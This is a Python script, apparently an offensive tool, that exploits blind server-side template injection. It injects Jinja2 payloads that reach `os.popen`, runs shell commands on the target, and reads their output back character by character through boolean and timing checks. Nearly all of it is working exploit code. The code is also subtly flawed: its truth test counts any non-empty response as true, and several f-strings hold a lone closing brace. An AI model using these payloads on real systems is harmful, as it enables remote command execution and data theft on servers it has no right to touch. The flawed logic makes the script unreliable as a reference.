#!/usr/bin/env python3
"""
Blind SSTI Data Exfiltration Tool
Extracts data character by character using boolean conditions
"""

import requests
import string
from typing import Optional
from rich.console import Console
from rich.progress import Progress

console = Console()

class BlindSSTIExploiter:
    """Extract data from blind SSTI vulnerabilities"""
    
    def __init__(self, url: str, param: str = 'template'):
        self.url = url
        self.param = param
        self.session = requests.Session()
        self.charset = string.printable
        
    def test_condition(self, payload: str) -> bool:
        """Test if a boolean condition is true"""
        try:
            response = self.session.get(
                self.url,
                params={self.param: payload},
                timeout=5
            )
            
            # Check for indicators of True condition
            # This may need customization based on target
            return '1' in response.text or 'True' in response.text or len(response.text) > 0
            
        except Exception as e:
            console.print(f"[red]Error:[/red] {e}")
            return False
    
    def extract_char(self, position: int, command: str) -> Optional[str]:
        """Extract a single character at given position"""
        
        for char in self.charset:
            # Build payload to check if character matches
            payload = (
                "{% if config.__class__.__init__.__globals__['os']"
                f".popen('{command}').read()[{position}] == '{char}' %}"
                "1{% endif %}"
            )
            
            if self.test_condition(payload):
                return char
        
        return None
    
    def extract_length(self, command: str, max_length: int = 1000) -> Optional[int]:
        """Determine length of command output"""
        
        # Binary search for length
        low, high = 0, max_length
        
        while low <= high:
            mid = (low + high) // 2
            
            payload = (
                "{% if config.__class__.__init__.__globals__['os']"
                f".popen('{command}').read().__len__() > {mid} %}"
                "1{% endif %}"
            )
            
            if self.test_condition(payload):
                low = mid + 1
            else:
                high = mid - 1
        
        return low if low > 0 else None
    
    def extract_output(self, command: str) -> Optional[str]:
        """Extract complete command output"""
        console.print(f"\n[yellow]Extracting output for:[/yellow] {command}")
        
        # First determine length
        length = self.extract_length(command)
        
        if not length:
            console.print("[red]Could not determine output length[/red]")
            return None
        
        console.print(f"[green]Output length:[/green] {length}")
        
        # Extract character by character
        output = ""
        
        with Progress() as progress:
            task = progress.add_task("[cyan]Extracting...", total=length)
            
            for pos in range(length):
                char = self.extract_char(pos, command)
                
                if char:
                    output += char
                    progress.update(task, advance=1)
                else:
                    console.print(f"[red]Failed at position {pos}[/red]")
                    break
        
        return output
    
    def time_based_test(self, delay: int = 5) -> bool:
        """Test for time-based blind SSTI"""
        import time
        
        payload = (
            "{% if config.__class__.__init__.__globals__['os']"
            f".popen('sleep {delay}').read() == 'x' %}1{{% endif %}}"
        )
        
        start = time.time()
        self.test_condition(payload)
        elapsed = time.time() - start
        
        return elapsed >= delay

# Usage example
if __name__ == "__main__":
    exploiter = BlindSSTIExploiter("http://localhost:5000/")
    
    # Test for time-based blind SSTI
    if exploiter.time_based_test():
        console.print("[green]Time-based blind SSTI detected![/green]")
        
        # Extract whoami output
        output = exploiter.extract_output("whoami")
        
        if output:
            console.print(f"\n[green bold]Result:[/green bold]\n{output}")
